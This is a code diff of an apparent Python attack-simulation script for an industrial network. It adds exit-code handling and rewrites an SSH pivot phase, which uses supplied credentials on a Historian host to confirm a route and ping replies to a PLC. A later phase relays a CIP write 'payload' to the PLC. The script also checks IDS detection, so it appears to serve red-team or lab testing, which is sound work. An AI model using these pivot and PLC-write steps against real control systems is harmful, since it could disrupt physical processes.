@@ -242,17 +242,18 @@ def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> 
     return client
 
 
-def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str]:
-    """Execute a command on an open SSHClient, return (stdout, stderr)."""
+def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str, int]:
+    """Execute a command on an open SSHClient, return (stdout, stderr, exit_code)."""
     info(f"remote $ {escape(cmd)}")
     _, stdout_ch, stderr_ch = client.exec_command(cmd, timeout=timeout)
-    stdout = stdout_ch.read().decode()
-    stderr = stderr_ch.read().decode()
+    stdout    = stdout_ch.read().decode()
+    stderr    = stderr_ch.read().decode()
+    exit_code = stdout_ch.channel.recv_exit_status()
     if stdout.strip():
         console.print(f"[dim]{escape(stdout.strip())}[/dim]")
     if stderr.strip():
         console.print(f"[dim red]{escape(stderr.strip())}[/dim red]")
-    return stdout, stderr
+    return stdout, stderr, exit_code
 
 
 def confirm_phase(title: str) -> bool:
@@ -486,22 +487,67 @@ def phase4_ssh_pivot() -> PhaseResult:
     try:
         client = ssh_connect(hostname=ip, username=username, password=password, port=port)
 
-        commands = {
-            "OT syslog (last 20 lines)": "grep '10.20.20' /var/log/syslog | tail -20",
-            "Routes to OT zone":         "ip route | grep 10.20",
-            "Ping PLC":                  f"ping -c 3 {CFG['plc']['ip']}",
-        }
-
+        plc_ip   = CFG["plc"]["ip"]
         findings = []
-        for label, cmd in commands.items():
-            console.print(f"\n[bold cyan]{label}[/bold cyan]")
-            stdout, stderr = ssh_run(client, cmd)
-            findings.append(f"{label}:\n{stdout}")
+        checks   = {"route": False, "ping": False, "syslog": False}
 
-        r.finding = f"OT zone route confirmed; PLC {CFG['plc']['ip']} reachable"
-        r.status  = "success"
-        r.output  = "\n".join(findings)
+        # ── 1. OT syslog ────────────────────────────────────────────────────
+        console.print("\n[bold cyan]OT syslog (last 20 lines)[/bold cyan]")
+        syslog_out, _, syslog_rc = ssh_run(client, "grep '10.20.20' /var/log/syslog | tail -20")
+        if syslog_out.strip():
+            checks["syslog"] = True
+            ok("OT zone syslog entries present")
+        else:
+            warn("No OT syslog entries found — rsyslog forwarding may not be running")
+        findings.append(f"Syslog:\n{syslog_out}")
+
+        # ── 2. Route to OT zone ─────────────────────────────────────────────
+        console.print("\n[bold cyan]Route to OT zone[/bold cyan]")
+        route_out, _, route_rc = ssh_run(client, f"ip route get {plc_ip}")
+        if route_rc == 0 and plc_ip in route_out:
+            checks["route"] = True
+            ok(f"Route to {plc_ip} exists")
+        else:
+            err(f"No route to {plc_ip} — OT zone may not be reachable from Historian")
+        findings.append(f"Route:\n{route_out}")
+
+        # ── 3. Ping PLC — parse ICMP replies, not just exit code ────────────
+        console.print("\n[bold cyan]Ping PLC[/bold cyan]")
+        ping_out, _, ping_rc = ssh_run(client, f"ping -c 4 -W 2 {plc_ip}")
+        # Only trust it if we see actual ICMP echo replies in the output
+        icmp_replies = [l for l in ping_out.splitlines() if "bytes from" in l]
+        if icmp_replies:
+            checks["ping"] = True
+            ok(f"PLC {plc_ip} is alive — {len(icmp_replies)} ICMP replies received")
+            for rep in icmp_replies:
+                console.print(f"  [green]{escape(rep.strip())}[/green]")
+        else:
+            err(f"PLC {plc_ip} did NOT respond to ping")
+            if "100% packet loss" in ping_out:
+                err("100% packet loss — host is unreachable or firewalled")
+            elif "Network unreachable" in ping_out or "No route" in ping_out:
+                err("Network unreachable — no route exists to OT zone")
+            else:
+                warn(f"Ping output was ambiguous:\n{ping_out[:300]}")
+        findings.append(f"Ping:\n{ping_out}")
+
         client.close()
+
+        # ── Determine overall phase result ───────────────────────────────────
+        if checks["route"] and checks["ping"]:
+            r.status  = "success"
+            r.finding = f"OT zone confirmed reachable — route + ICMP verified to {plc_ip}"
+            ok(r.finding)
+        elif checks["route"] and not checks["ping"]:
+            r.status  = "failed"
+            r.finding = f"Route to {plc_ip} exists but host does not respond (down or firewalled)"
+            err(r.finding)
+        elif not checks["route"]:
+            r.status  = "failed"
+            r.finding = f"No route from Historian to OT zone ({plc_ip}) — pivot blocked"
+            err(r.finding)
+
+        r.output = "\n".join(findings)
 
     except paramiko.AuthenticationException:
         r.status  = "failed"
@@ -559,7 +605,7 @@ def phase5_plc_attack() -> PhaseResult:
             port=hist_port,
         )
         ok(f"Sending CIP Write via Historian ({hist_ip}) → PLC ({plc_ip})")
-        stdout, stderr = ssh_run(client, payload, timeout=30)
+        stdout, stderr, _ = ssh_run(client, payload, timeout=30)
         client.close()
 
         if f"After: {atk_val}" in stdout:
@@ -608,7 +654,7 @@ def phase6_defense_check() -> PhaseResult:
             password=ids_password,
             port=ids_port,
         )
-        stdout, _ = ssh_run(client, ids_cmd)
+        stdout, _, _ = ssh_run(client, ids_cmd)
         client.close()
 
         if stdout.strip():
